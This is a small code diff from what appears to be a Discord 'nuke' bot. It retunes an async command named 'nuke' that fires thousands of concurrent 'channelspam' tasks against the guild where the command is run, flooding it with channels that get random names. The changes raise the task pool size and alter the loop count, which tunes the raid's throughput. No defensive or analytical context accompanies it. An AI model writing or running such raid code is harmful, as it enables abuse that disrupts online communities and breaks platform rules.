@@ -71,8 +71,8 @@ async def nuke(ctx):
     global guild
     guild = ctx.guild.id
     async with httpx.AsyncClient() as session:
-        async with TaskPool(5_000) as tasks:
-            for i in range(5004):
+        async with TaskPool(6000) as tasks:
+            for _i in range(2000):
                 await tasks.put(asyncio.create_task(channelspam(random.choice(channel_names), session)))
 
 
